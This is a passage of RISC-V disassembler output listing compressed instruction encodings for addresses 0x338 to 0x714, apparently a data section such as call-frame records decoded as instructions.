 338:	c842                	sw	a6,16(sp)
 33a:	020c                	addi	a1,sp,256
 33c:	4230                	lw	a2,64(a2)
 33e:	42c9                	li	t0,18
 340:	000e                	c.slli	zero,0x3
 342:	0000                	unimp
 344:	0000                	unimp
 346:	0000                	unimp
 348:	002c                	addi	a1,sp,8
 34a:	0000                	unimp
 34c:	00e0                	addi	s0,sp,76
 34e:	0000                	unimp
 350:	1b64                	addi	s1,sp,444
 352:	8000                	0x8000
 354:	0000                	unimp
 356:	0000                	unimp
 358:	0026                	c.slli	zero,0x9
 35a:	0000                	unimp
 35c:	0000                	unimp
 35e:	0000                	unimp
 360:	0e42                	slli	t3,t3,0x10
 362:	4220                	lw	s0,64(a2)
 364:	0288                	addi	a0,sp,320
 366:	0c42                	slli	s8,s8,0x10
 368:	0008                	0x8
 36a:	c85c                	sw	a5,20(s0)
 36c:	020c                	addi	a1,sp,256
 36e:	4220                	lw	s0,64(a2)
 370:	000e                	c.slli	zero,0x3
 372:	0000                	unimp
 374:	0000                	unimp
 376:	0000                	unimp
 378:	002c                	addi	a1,sp,8
 37a:	0000                	unimp
 37c:	00e0                	addi	s0,sp,76
 37e:	0000                	unimp
 380:	1b8a                	slli	s7,s7,0x22
 382:	8000                	0x8000
 384:	0000                	unimp
 386:	0000                	unimp
 388:	002a                	c.slli	zero,0xa
 38a:	0000                	unimp
 38c:	0000                	unimp
 38e:	0000                	unimp
 390:	0e42                	slli	t3,t3,0x10
 392:	4420                	lw	s0,72(s0)
 394:	0281                	addi	t0,t0,0
 396:	0488                	addi	a0,sp,576
 398:	0c42                	slli	s8,s8,0x10
 39a:	0008                	0x8
 39c:	c15c                	sw	a5,4(a0)
 39e:	c842                	sw	a6,16(sp)
 3a0:	020c                	addi	a1,sp,256
 3a2:	4220                	lw	s0,64(a2)
 3a4:	000e                	c.slli	zero,0x3
 3a6:	0000                	unimp
 3a8:	002c                	addi	a1,sp,8
 3aa:	0000                	unimp
 3ac:	00e0                	addi	s0,sp,76
 3ae:	0000                	unimp
 3b0:	1bb4                	addi	a3,sp,504
 3b2:	8000                	0x8000
 3b4:	0000                	unimp
 3b6:	0000                	unimp
 3b8:	005a                	c.slli	zero,0x16
 3ba:	0000                	unimp
 3bc:	0000                	unimp
 3be:	0000                	unimp
 3c0:	0e42                	slli	t3,t3,0x10
 3c2:	4420                	lw	s0,72(s0)
 3c4:	0281                	addi	t0,t0,0
 3c6:	0488                	addi	a0,sp,576
 3c8:	0c42                	slli	s8,s8,0x10
 3ca:	0008                	0x8
 3cc:	4c02                	lw	s8,0(sp)
 3ce:	42c1                	li	t0,16
 3d0:	0cc8                	addi	a0,sp,596
 3d2:	2002                	fld	ft0,0(sp)
 3d4:	0e42                	slli	t3,t3,0x10
 3d6:	0000                	unimp
 3d8:	0024                	addi	s1,sp,8
 3da:	0000                	unimp
 3dc:	00e0                	addi	s0,sp,76
 3de:	0000                	unimp
 3e0:	1c0e                	slli	s8,s8,0x23
 3e2:	8000                	0x8000
 3e4:	0000                	unimp
 3e6:	0000                	unimp
 3e8:	00e6                	slli	ra,ra,0x19
 3ea:	0000                	unimp
 3ec:	0000                	unimp
 3ee:	0000                	unimp
 3f0:	0e42                	slli	t3,t3,0x10
 3f2:	01b0                	addi	a2,sp,200
 3f4:	8146                	mv	sp,a7
 3f6:	8802                	jr	a6
 3f8:	8904                	0x8904
 3fa:	4206                	lw	tp,64(sp)
 3fc:	080c                	addi	a1,sp,16
 3fe:	0000                	unimp
 400:	002c                	addi	a1,sp,8
 402:	0000                	unimp
 404:	00e0                	addi	s0,sp,76
 406:	0000                	unimp
 408:	1cf4                	addi	a3,sp,636
 40a:	8000                	0x8000
 40c:	0000                	unimp
 40e:	0000                	unimp
 410:	0072                	c.slli	zero,0x1c
 412:	0000                	unimp
 414:	0000                	unimp
 416:	0000                	unimp
 418:	0e42                	slli	t3,t3,0x10
 41a:	4420                	lw	s0,72(s0)
 41c:	0281                	addi	t0,t0,0
 41e:	0488                	addi	a0,sp,576
 420:	0c42                	slli	s8,s8,0x10
 422:	0008                	0x8
 424:	6402                	ld	s0,0(sp)
 426:	42c1                	li	t0,16
 428:	0cc8                	addi	a0,sp,596
 42a:	2002                	fld	ft0,0(sp)
 42c:	0e42                	slli	t3,t3,0x10
 42e:	0000                	unimp
 430:	002c                	addi	a1,sp,8
 432:	0000                	unimp
 434:	00e0                	addi	s0,sp,76
 436:	0000                	unimp
 438:	1d66                	slli	s10,s10,0x39
 43a:	8000                	0x8000
 43c:	0000                	unimp
 43e:	0000                	unimp
 440:	008e                	slli	ra,ra,0x3
 442:	0000                	unimp
 444:	0000                	unimp
 446:	0000                	unimp
 448:	0e42                	slli	t3,t3,0x10
 44a:	4440                	lw	s0,12(s0)
 44c:	0281                	addi	t0,t0,0
 44e:	0488                	addi	a0,sp,576
 450:	0c42                	slli	s8,s8,0x10
 452:	0008                	0x8
 454:	8002                	0x8002
 456:	42c1                	li	t0,16
 458:	0cc8                	addi	a0,sp,596
 45a:	4002                	0x4002
 45c:	0e42                	slli	t3,t3,0x10
 45e:	0000                	unimp
 460:	0034                	addi	a3,sp,8
 462:	0000                	unimp
 464:	00e0                	addi	s0,sp,76
 466:	0000                	unimp
 468:	1df4                	addi	a3,sp,764
 46a:	8000                	0x8000
 46c:	0000                	unimp
 46e:	0000                	unimp
 470:	0102                	slli	sp,sp,0x0
 472:	0000                	unimp
 474:	0000                	unimp
 476:	0000                	unimp
 478:	0e42                	slli	t3,t3,0x10
 47a:	02d0                	addi	a2,sp,324
 47c:	8144                	0x8144
 47e:	8802                	jr	a6
 480:	4204                	lw	s1,0(a2)
 482:	080c                	addi	a1,sp,16
 484:	0200                	addi	s0,sp,256
 486:	c1f4                	sw	a3,68(a1)
 488:	c842                	sw	a6,16(sp)
 48a:	020c                	addi	a1,sp,256
 48c:	02d0                	addi	a2,sp,324
 48e:	0e42                	slli	t3,t3,0x10
	...
 498:	002c                	addi	a1,sp,8
 49a:	0000                	unimp
 49c:	00e0                	addi	s0,sp,76
 49e:	0000                	unimp
 4a0:	1ef6                	slli	t4,t4,0x3d
 4a2:	8000                	0x8000
 4a4:	0000                	unimp
 4a6:	0000                	unimp
 4a8:	006c                	addi	a1,sp,12
 4aa:	0000                	unimp
 4ac:	0000                	unimp
 4ae:	0000                	unimp
 4b0:	0e42                	slli	t3,t3,0x10
 4b2:	4220                	lw	s0,64(a2)
 4b4:	0288                	addi	a0,sp,320
 4b6:	0c42                	slli	s8,s8,0x10
 4b8:	0008                	0x8
 4ba:	6202                	ld	tp,0(sp)
 4bc:	0cc8                	addi	a0,sp,596
 4be:	2002                	fld	ft0,0(sp)
 4c0:	0e42                	slli	t3,t3,0x10
 4c2:	0000                	unimp
 4c4:	0000                	unimp
 4c6:	0000                	unimp
 4c8:	002c                	addi	a1,sp,8
 4ca:	0000                	unimp
 4cc:	00e0                	addi	s0,sp,76
 4ce:	0000                	unimp
 4d0:	1f62                	slli	t5,t5,0x38
 4d2:	8000                	0x8000
 4d4:	0000                	unimp
 4d6:	0000                	unimp
 4d8:	0068                	addi	a0,sp,12
 4da:	0000                	unimp
 4dc:	0000                	unimp
 4de:	0000                	unimp
 4e0:	0e42                	slli	t3,t3,0x10
 4e2:	4220                	lw	s0,64(a2)
 4e4:	0288                	addi	a0,sp,320
 4e6:	0c42                	slli	s8,s8,0x10
 4e8:	0008                	0x8
 4ea:	5e02                	lw	t3,32(sp)
 4ec:	0cc8                	addi	a0,sp,596
 4ee:	2002                	fld	ft0,0(sp)
 4f0:	0e42                	slli	t3,t3,0x10
 4f2:	0000                	unimp
 4f4:	0000                	unimp
 4f6:	0000                	unimp
 4f8:	0034                	addi	a3,sp,8
 4fa:	0000                	unimp
 4fc:	00e0                	addi	s0,sp,76
 4fe:	0000                	unimp
 500:	1fca                	slli	t6,t6,0x32
 502:	8000                	0x8000
 504:	0000                	unimp
 506:	0000                	unimp
 508:	035e                	slli	t1,t1,0x17
 50a:	0000                	unimp
 50c:	0000                	unimp
 50e:	0000                	unimp
 510:	0e42                	slli	t3,t3,0x10
 512:	4870                	lw	a2,84(s0)
 514:	0281                	addi	t0,t0,0
 516:	0488                	addi	a0,sp,576
 518:	0689                	addi	a3,a3,2
 51a:	0892                	slli	a7,a7,0x4
 51c:	0c42                	slli	s8,s8,0x10
 51e:	0008                	0x8
 520:	c1034803          	lbu	a6,-1008(t1) # ffffffffffff9c10 <_end+0xffffffff7ffde750>
 524:	c842                	sw	a6,16(sp)
 526:	020c                	addi	a1,sp,256
 528:	4270                	lw	a2,68(a2)
 52a:	42c9                	li	t0,18
 52c:	42d2                	lw	t0,20(sp)
 52e:	000e                	c.slli	zero,0x3
 530:	002c                	addi	a1,sp,8
 532:	0000                	unimp
 534:	00e0                	addi	s0,sp,76
 536:	0000                	unimp
 538:	2328                	fld	fa0,64(a4)
 53a:	8000                	0x8000
 53c:	0000                	unimp
 53e:	0000                	unimp
 540:	0056                	c.slli	zero,0x15
 542:	0000                	unimp
 544:	0000                	unimp
 546:	0000                	unimp
 548:	0e42                	slli	t3,t3,0x10
 54a:	4470                	lw	a2,76(s0)
 54c:	1281                	addi	t0,t0,-32
 54e:	1488                	addi	a0,sp,608
 550:	0c42                	slli	s8,s8,0x10
 552:	4008                	lw	a0,0(s0)
 554:	4802                	lw	a6,0(sp)
 556:	42c1                	li	t0,16
 558:	0cc8                	addi	a0,sp,596
 55a:	7002                	0x7002
 55c:	0e42                	slli	t3,t3,0x10
 55e:	0000                	unimp
 560:	002c                	addi	a1,sp,8
 562:	0000                	unimp
 564:	00e0                	addi	s0,sp,76
 566:	0000                	unimp
 568:	237e                	fld	ft6,472(sp)
 56a:	8000                	0x8000
 56c:	0000                	unimp
 56e:	0000                	unimp
 570:	0046                	c.slli	zero,0x11
 572:	0000                	unimp
 574:	0000                	unimp
 576:	0000                	unimp
 578:	0e42                	slli	t3,t3,0x10
 57a:	4240                	lw	s0,4(a2)
 57c:	0288                	addi	a0,sp,320
 57e:	0c42                	slli	s8,s8,0x10
 580:	0008                	0x8
 582:	c87c                	sw	a5,84(s0)
 584:	020c                	addi	a1,sp,256
 586:	4240                	lw	s0,4(a2)
 588:	000e                	c.slli	zero,0x3
 58a:	0000                	unimp
 58c:	0000                	unimp
 58e:	0000                	unimp
 590:	0034                	addi	a3,sp,8
 592:	0000                	unimp
 594:	00e0                	addi	s0,sp,76
 596:	0000                	unimp
 598:	23c4                	fld	fs1,128(a5)
 59a:	8000                	0x8000
 59c:	0000                	unimp
 59e:	0000                	unimp
 5a0:	00c2                	slli	ra,ra,0x10
 5a2:	0000                	unimp
 5a4:	0000                	unimp
 5a6:	0000                	unimp
 5a8:	0e42                	slli	t3,t3,0x10
 5aa:	0290                	addi	a2,sp,320
 5ac:	8144                	0x8144
 5ae:	880e                	mv	a6,gp
 5b0:	4210                	lw	a2,0(a2)
 5b2:	080c                	addi	a1,sp,16
 5b4:	0230                	addi	a2,sp,264
 5b6:	c1b4                	sw	a3,64(a1)
 5b8:	c842                	sw	a6,16(sp)
 5ba:	020c                	addi	a1,sp,256
 5bc:	0290                	addi	a2,sp,320
 5be:	0e42                	slli	t3,t3,0x10
	...
 5c8:	002c                	addi	a1,sp,8
 5ca:	0000                	unimp
 5cc:	00e0                	addi	s0,sp,76
 5ce:	0000                	unimp
 5d0:	2486                	fld	fs1,64(sp)
 5d2:	8000                	0x8000
 5d4:	0000                	unimp
 5d6:	0000                	unimp
 5d8:	00b8                	addi	a4,sp,72
 5da:	0000                	unimp
 5dc:	0000                	unimp
 5de:	0000                	unimp
 5e0:	0e42                	slli	t3,t3,0x10
 5e2:	4250                	lw	a2,4(a2)
 5e4:	0288                	addi	a0,sp,320
 5e6:	0c42                	slli	s8,s8,0x10
 5e8:	0008                	0x8
 5ea:	ae02                	fsd	ft0,280(sp)
 5ec:	0cc8                	addi	a0,sp,596
 5ee:	5002                	0x5002
 5f0:	0e42                	slli	t3,t3,0x10
 5f2:	0000                	unimp
 5f4:	0000                	unimp
 5f6:	0000                	unimp
 5f8:	002c                	addi	a1,sp,8
 5fa:	0000                	unimp
 5fc:	00e0                	addi	s0,sp,76
 5fe:	0000                	unimp
 600:	253e                	fld	fa0,456(sp)
 602:	8000                	0x8000
 604:	0000                	unimp
 606:	0000                	unimp
 608:	00ce                	slli	ra,ra,0x13
 60a:	0000                	unimp
 60c:	0000                	unimp
 60e:	0000                	unimp
 610:	0e42                	slli	t3,t3,0x10
 612:	4250                	lw	a2,4(a2)
 614:	0288                	addi	a0,sp,320
 616:	0c42                	slli	s8,s8,0x10
 618:	0008                	0x8
 61a:	c402                	sw	zero,8(sp)
 61c:	0cc8                	addi	a0,sp,596
 61e:	5002                	0x5002
 620:	0e42                	slli	t3,t3,0x10
 622:	0000                	unimp
 624:	0000                	unimp
 626:	0000                	unimp
 628:	002c                	addi	a1,sp,8
 62a:	0000                	unimp
 62c:	00e0                	addi	s0,sp,76
 62e:	0000                	unimp
 630:	260c                	fld	fa1,8(a2)
 632:	8000                	0x8000
 634:	0000                	unimp
 636:	0000                	unimp
 638:	003c                	addi	a5,sp,8
 63a:	0000                	unimp
 63c:	0000                	unimp
 63e:	0000                	unimp
 640:	0e42                	slli	t3,t3,0x10
 642:	4230                	lw	a2,64(a2)
 644:	0288                	addi	a0,sp,320
 646:	0c42                	slli	s8,s8,0x10
 648:	0008                	0x8
 64a:	c872                	sw	t3,16(sp)
 64c:	020c                	addi	a1,sp,256
 64e:	4230                	lw	a2,64(a2)
 650:	000e                	c.slli	zero,0x3
 652:	0000                	unimp
 654:	0000                	unimp
 656:	0000                	unimp
 658:	002c                	addi	a1,sp,8
 65a:	0000                	unimp
 65c:	00e0                	addi	s0,sp,76
 65e:	0000                	unimp
 660:	2648                	fld	fa0,136(a2)
 662:	8000                	0x8000
 664:	0000                	unimp
 666:	0000                	unimp
 668:	004e                	c.slli	zero,0x13
 66a:	0000                	unimp
 66c:	0000                	unimp
 66e:	0000                	unimp
 670:	0e42                	slli	t3,t3,0x10
 672:	4230                	lw	a2,64(a2)
 674:	0288                	addi	a0,sp,320
 676:	0c42                	slli	s8,s8,0x10
 678:	0008                	0x8
 67a:	4402                	lw	s0,0(sp)
 67c:	0cc8                	addi	a0,sp,596
 67e:	3002                	fld	ft0,32(sp)
 680:	0e42                	slli	t3,t3,0x10
 682:	0000                	unimp
 684:	0000                	unimp
 686:	0000                	unimp
 688:	002c                	addi	a1,sp,8
 68a:	0000                	unimp
 68c:	00e0                	addi	s0,sp,76
 68e:	0000                	unimp
 690:	2696                	fld	fa3,320(sp)
 692:	8000                	0x8000
 694:	0000                	unimp
 696:	0000                	unimp
 698:	0070                	addi	a2,sp,12
 69a:	0000                	unimp
 69c:	0000                	unimp
 69e:	0000                	unimp
 6a0:	0e42                	slli	t3,t3,0x10
 6a2:	4230                	lw	a2,64(a2)
 6a4:	0288                	addi	a0,sp,320
 6a6:	0c42                	slli	s8,s8,0x10
 6a8:	0008                	0x8
 6aa:	6602                	ld	a2,0(sp)
 6ac:	0cc8                	addi	a0,sp,596
 6ae:	3002                	fld	ft0,32(sp)
 6b0:	0e42                	slli	t3,t3,0x10
 6b2:	0000                	unimp
 6b4:	0000                	unimp
 6b6:	0000                	unimp
 6b8:	002c                	addi	a1,sp,8
 6ba:	0000                	unimp
 6bc:	00e0                	addi	s0,sp,76
 6be:	0000                	unimp
 6c0:	2706                	fld	fa4,64(sp)
 6c2:	8000                	0x8000
 6c4:	0000                	unimp
 6c6:	0000                	unimp
 6c8:	004a                	c.slli	zero,0x12
 6ca:	0000                	unimp
 6cc:	0000                	unimp
 6ce:	0000                	unimp
 6d0:	0e42                	slli	t3,t3,0x10
 6d2:	4230                	lw	a2,64(a2)
 6d4:	0288                	addi	a0,sp,320
 6d6:	0c42                	slli	s8,s8,0x10
 6d8:	0008                	0x8
 6da:	4002                	0x4002
 6dc:	0cc8                	addi	a0,sp,596
 6de:	3002                	fld	ft0,32(sp)
 6e0:	0e42                	slli	t3,t3,0x10
 6e2:	0000                	unimp
 6e4:	0000                	unimp
 6e6:	0000                	unimp
 6e8:	002c                	addi	a1,sp,8
 6ea:	0000                	unimp
 6ec:	00e0                	addi	s0,sp,76
 6ee:	0000                	unimp
 6f0:	2750                	fld	fa2,136(a4)
 6f2:	8000                	0x8000
 6f4:	0000                	unimp
 6f6:	0000                	unimp
 6f8:	00dc                	addi	a5,sp,68
 6fa:	0000                	unimp
 6fc:	0000                	unimp
 6fe:	0000                	unimp
 700:	0e42                	slli	t3,t3,0x10
 702:	4230                	lw	a2,64(a2)
 704:	0288                	addi	a0,sp,320
 706:	0c42                	slli	s8,s8,0x10
 708:	0008                	0x8
 70a:	d202                	sw	zero,36(sp)
 70c:	0cc8                	addi	a0,sp,596
 70e:	3002                	fld	ft0,32(sp)
 710:	0e42                	slli	t3,t3,0x10
 712:	0000                	unimp
 714:	0000                	unimp
	...
